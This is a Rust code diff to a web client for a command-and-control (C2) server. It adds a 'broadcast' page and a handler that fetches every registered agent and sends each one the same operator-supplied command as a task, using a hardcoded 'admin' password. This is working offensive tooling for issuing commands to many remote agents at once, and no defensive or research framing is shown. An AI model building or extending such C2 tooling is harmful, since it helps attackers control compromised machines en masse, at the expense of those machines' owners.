@@ -579,6 +579,70 @@ async fn create_task(
     Ok(Redirect::to(&format!("/agent/{}", agent_id)))
 }
 
+#[derive(Template)]
+#[template(path = "broadcast.html")]
+struct BroadcastTemplate {
+    predefined_commands: Vec<PredefinedCommand>,
+}
+
+async fn broadcast_page() -> Result<Html<String>, String> {
+    let template = BroadcastTemplate {
+        predefined_commands: get_predefined_commands(),
+    };
+
+    template
+        .render()
+        .map(Html)
+        .map_err(|e| format!("Template error: {}", e))
+}
+
+async fn broadcast_task(Form(form): Form<TaskForm>) -> Result<impl IntoResponse, String> {
+    let c2_server_url = get_c2_server_url();
+    let client = reqwest::Client::new();
+
+    let agents_response = client
+        .get(format!("{}/agents", c2_server_url))
+        .send()
+        .await
+        .map_err(|e| format!("Failed to fetch agents: {}", e))?;
+
+    let agents: Vec<serde_json::Value> = agents_response
+        .json()
+        .await
+        .map_err(|e| format!("Failed to parse agents: {}", e))?;
+
+    let mut _success_count = 0;
+    let mut _failed_count = 0;
+
+    for agent in agents {
+        if let Some(agent_id_str) = agent["id"].as_str() {
+            if let Ok(agent_uuid) = Uuid::parse_str(agent_id_str) {
+                let request = AddTaskRequest {
+                    password: "admin".to_string(),
+                    agent_id: agent_uuid,
+                    command: form.command.clone(),
+                };
+
+                match client
+                    .post(format!("{}/add_task", c2_server_url))
+                    .json(&request)
+                    .send()
+                    .await
+                {
+                    Ok(response) if response.status().is_success() => {
+                        _success_count += 1;
+                    }
+                    _ => {
+                        _failed_count += 1;
+                    }
+                }
+            }
+        }
+    }
+
+    Ok(Redirect::to("/"))
+}
+
 #[tokio::main]
 async fn main() {
     let c2_server_url = get_c2_server_url();
@@ -586,7 +650,9 @@ async fn main() {
     let app = Router::new()
         .route("/", get(index))
         .route("/agent/:id", get(agent_detail))
-        .route("/agent/:id/task", post(create_task));
+        .route("/agent/:id/task", post(create_task))
+        .route("/broadcast", get(broadcast_page))
+        .route("/broadcast/task", post(broadcast_task));
 
     let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
     println!("[*] [ REDACTED ] C2 Web Client starting...");
